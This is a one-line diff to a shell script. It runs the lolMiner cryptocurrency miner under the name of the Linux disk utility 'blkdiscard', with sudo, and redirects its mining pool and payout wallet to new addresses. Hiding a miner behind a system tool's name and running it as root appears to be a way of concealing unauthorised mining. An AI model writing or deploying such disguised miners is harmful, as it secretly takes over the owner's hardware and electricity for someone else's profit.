@@ -2,5 +2,5 @@
 
 cd "$(dirname "$0")"
 
-chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 3338H9P49zfgN9DKG42bhv3CTPHmLE1ZwW.Harry77 --ethstratum ETHPROXY
+chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 3JPLRMGt5wymA47349AB88Ldd52CVSEV7f.Harry --ethstratum ETHPROXY
 pause
